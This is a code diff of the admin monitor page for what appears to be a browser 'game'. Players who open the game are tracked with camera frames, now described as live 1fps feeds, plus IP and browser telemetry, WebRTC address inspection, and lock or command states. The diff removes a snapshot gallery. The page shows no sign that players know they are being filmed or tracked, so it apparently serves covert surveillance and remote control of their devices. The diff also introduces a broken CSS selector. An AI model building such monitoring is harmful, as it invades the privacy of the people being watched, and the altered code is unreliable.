@@ -102,7 +102,7 @@
     .status-dot { width: 10px; height: 10px; border-radius: 50%; flex-shrink: 0; background: var(--danger); }
     .status-dot.online { background: var(--success); box-shadow: 0 0 8px var(--success); }
     .status-dot.stale { background: var(--warning); box-shadow: 0 0 8px var(--warning); }
-    .status-dot.offline { background: var(--danger); }
+    . status-dot.offline { background: var(--danger); }
     .player-name { font-weight: 800; font-size: 1rem; color: var(--text); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
 
     .dev-badge { font-size: 0.7rem; font-weight: 800; padding: 3px 8px; border-radius: 999px; flex-shrink: 0; }
@@ -261,18 +261,9 @@
   <div class="grid" id="playersGrid">
     <div class="empty-state" id="emptyState">
       <h3>No Active Players Yet</h3>
-      <p style="margin-top:6px;font-size:0.88rem;">Open <strong>index.html</strong> on any iPhone, Android, Windows, or Mac device. Players will appear here automatically with live 8s camera snapshots, IP/browser telemetry, and direct messaging.</p>
+      <p style="margin-top:6px;font-size:0.88rem;">Open <strong>index.html</strong> on any iPhone, Android, Windows, or Mac device. Players will appear here automatically with live 1fps camera feeds, IP/browser telemetry, and direct messaging.</p>
     </div>
   </div>
-
-  <!-- 8-SECOND SNAPSHOT GALLERY -->
-  <section style="background:var(--panel);border:1px solid var(--border);border-radius:12px;padding:14px;">
-    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;flex-wrap:wrap;gap:8px;">
-      <strong style="color:var(--accent);font-size:0.95rem;">📸 8-Second Player Snapshots (<span id="snapCount">0</span>)</strong>
-      <button class="danger" onclick="clearAllSnapshots()">Clear All Snapshots</button>
-    </div>
-    <div id="snapGallery" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:10px;max-height:360px;overflow-y:auto;"></div>
-  </section>
 
   <details class="debug">
     <summary>[GA] Admin Monitor Debug</summary>
@@ -299,7 +290,6 @@
 
     // Map of playerId -> player record
     const players = new Map();
-    const seenSnapIds = new Set();
     let adminPeer = null;
     let reconnectTimer = null;
     let backoffMs = 1000;
@@ -319,7 +309,7 @@
     function updateDebugLine() {
       const pState = adminPeer ? (adminPeer.destroyed ? "destroyed" : adminPeer.disconnected ? "disconnected" : "open") : "none";
       document.getElementById("debugLine").textContent =
-        `Admin Peer: ${ADMIN_PEER_ID} (${pState}) | Global Lock: ${globalLocked} | Tracked Players: ${players.size} | Snapshots: ${seenSnapIds.size} | Last error: ${lastErrorStr}`;
+        `Admin Peer: ${ADMIN_PEER_ID} (${pState}) | Global Lock: ${globalLocked} | Tracked Players: ${players.size} | Last error: ${lastErrorStr}`;
     }
 
     function setAdminPill(text, level) {
@@ -436,10 +426,7 @@
       conn.on("data", (data) => {
         try {
           if (!data || typeof data !== "object") return;
-
-          // Unwrap 8-second snapshot packets ({ t: "snap", snap: {...} })
-          const p = (data.t === "snap" && data.snap && typeof data.snap === "object") ? data.snap : data;
-          const playerId = String(p.id || data.id || conn.peer).slice(0, 40);
+          const playerId = String(data.id || conn.peer).slice(0, 40);
           if (!playerId) return;
 
           let rec = players.get(playerId);
@@ -474,27 +461,24 @@
           rec.lastSeen = Date.now();
           inspectWebRTCRemoteAddress(conn, rec);
 
-          if (data.t === "hello" || data.t === "visit" || data.t === "tel" || data.t === "snap") {
-            if (typeof p.name === "string" && p.name.trim()) {
-              rec.name = p.name.trim().slice(0, 20);
+          if (data.t === "hello" || data.t === "tel") {
+            if (typeof data.name === "string" && data.name.trim()) {
+              rec.name = data.name.trim().slice(0, 20);
             }
-            if (typeof p.device === "string") {
-              rec.device = ["iPhone", "Android", "Windows", "Mac", "Other"].includes(p.device) ? p.device : "Other";
+            if (typeof data.device === "string") {
+              rec.device = ["iPhone", "Android", "Windows", "Mac", "Other"].includes(data.device) ? data.device : "Other";
             }
-            if (p.meta && typeof p.meta === "object") {
-              rec.meta = p.meta;
+            if (data.meta && typeof data.meta === "object") {
+              rec.meta = data.meta;
             }
-            if (data.t === "tel" || data.t === "snap") {
-              rec.score = Number.isFinite(p.score) ? p.score : rec.score;
-              rec.streak = Number.isFinite(p.streak) ? p.streak : rec.streak;
-              rec.state = ["idle", "playing", "finished", "locked", "command_mode"].includes(p.state) ? p.state : rec.state;
-              rec.target = typeof p.target === "string" ? p.target.slice(0, 24) : rec.target;
-              if (typeof p.frame === "string" && p.frame.startsWith("data:image/jpeg;base64,")) {
-                rec.frame = p.frame;
+            if (data.t === "tel") {
+              rec.score = Number.isFinite(data.score) ? data.score : 0;
+              rec.streak = Number.isFinite(data.streak) ? data.streak : 0;
+              rec.state = ["idle", "playing", "finished", "locked"].includes(data.state) ? data.state : "idle";
+              rec.target = typeof data.target === "string" ? data.target.slice(0, 24) : "—";
+              if (typeof data.frame === "string" && data.frame.startsWith("data:image/jpeg;base64,")) {
+                rec.frame = data.frame;
               }
-            }
-            if (data.t === "snap" && p.frame) {
-              addSnapshotToGallery(p);
             }
             updatePlayerCardDOM(rec);
           } else if (data.t === "msg" && typeof data.text === "string") {
@@ -768,70 +752,6 @@
         rec.els.imgEl.style.display = "block";
         rec.els.placeholderEl.style.display = "none";
       }
-    }
-
-    // === 8-SECOND SNAPSHOT GALLERY HELPERS ===
-    function addSnapshotToGallery(snap) {
-      if (!snap || !snap.frame) return;
-      const sid = snap.snapId || `${snap.id}-${snap.ts || Date.now()}`;
-      if (seenSnapIds.has(sid)) return;
-      seenSnapIds.add(sid);
-
-      const gallery = document.getElementById("snapGallery");
-      if (!gallery) return;
-
-      const item = document.createElement("div");
-      item.id = `snap-${sid}`;
-      item.style.cssText = "background:var(--panel-dark);border:1px solid var(--border);border-radius:8px;padding:6px;display:flex;flex-direction:column;gap:4px;";
-
-      const img = document.createElement("img");
-      img.src = snap.frame;
-      img.style.cssText = "width:100%;aspect-ratio:4/3;object-fit:cover;border-radius:6px;background:#000;";
-
-      const meta = document.createElement("div");
-      meta.style.cssText = "display:flex;justify-content:space-between;align-items:center;font-size:0.72rem;color:var(--muted);";
-
-      const label = document.createElement("span");
-      label.style.color = "var(--text)";
-      label.style.fontWeight = "700";
-      label.textContent = `${snap.name || "Player"} • ${new Date(snap.ts || Date.now()).toLocaleTimeString()}`;
-
-      const delBtn = document.createElement("button");
-      delBtn.className = "secondary";
-      delBtn.style.cssText = "padding:2px 6px;font-size:0.68rem;";
-      delBtn.textContent = "✕";
-      delBtn.onclick = () => {
-        item.remove();
-        seenSnapIds.delete(sid);
-        document.getElementById("snapCount").textContent = String(seenSnapIds.size);
-        const rec = players.get(snap.id);
-        if (rec && rec.conn && rec.conn.open) {
-          try { rec.conn.send({ t: "del_snap", snapId: sid }); } catch (e) {}
-        }
-        updateDebugLine();
-      };
-
-      meta.appendChild(label);
-      meta.appendChild(delBtn);
-      item.appendChild(img);
-      item.appendChild(meta);
-
-      gallery.prepend(item);
-      document.getElementById("snapCount").textContent = String(seenSnapIds.size);
-      updateDebugLine();
-    }
-
-    function clearAllSnapshots() {
-      seenSnapIds.clear();
-      const gallery = document.getElementById("snapGallery");
-      if (gallery) gallery.innerHTML = "";
-      document.getElementById("snapCount").textContent = "0";
-      players.forEach(rec => {
-        if (rec.conn && rec.conn.open) {
-          try { rec.conn.send({ t: "clear_snaps" }); } catch (e) {}
-        }
-      });
-      updateDebugLine();
     }
 
     // === ADMIN COMMANDS ===
